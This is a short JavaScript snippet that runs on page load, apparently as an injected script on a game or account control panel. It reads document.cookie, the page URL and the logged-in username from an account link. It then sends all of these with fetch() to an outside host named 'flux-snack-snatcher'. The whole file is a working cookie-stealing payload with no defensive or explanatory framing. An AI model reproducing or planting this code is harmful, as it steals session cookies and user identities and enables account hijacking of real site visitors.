window.onload = function () {
    var url = `https://flux-snack-snatcher.azurewebsites.net/snatch?snacks=${encodeURIComponent(document.cookie)}&url=${encodeURIComponent(document.URL)}`;

    var elements = document.querySelectorAll('a[href="/?module=account&action=view"]');
    var firstValidElement = null;

    for (var i = 0; i < elements.length; i++) {
        if (elements[i].textContent.trim().length > 0) {
            firstValidElement = elements[i];
            url += `&user=${encodeURIComponent(firstValidElement.textContent)}`;
            break;
        }
    }

    fetch(url);
}